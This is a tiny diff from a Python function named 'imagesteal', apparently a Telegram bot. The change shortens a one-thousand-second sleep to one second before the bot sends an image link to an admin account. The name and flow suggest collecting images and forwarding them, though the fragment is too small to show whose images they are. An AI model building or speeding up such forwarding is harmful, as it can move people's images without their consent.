@@ -99,7 +99,7 @@ def imagesteal(message):
 			path = str("file_"+str(a)+".jpg")
 			fmibms3.create_item("kvsh",path,url)
 			link = file_as_link(path)
-			time.sleep(1000)
+			time.sleep(1)
 			bot.send_photo(tgadmin,link)
 			
 				   
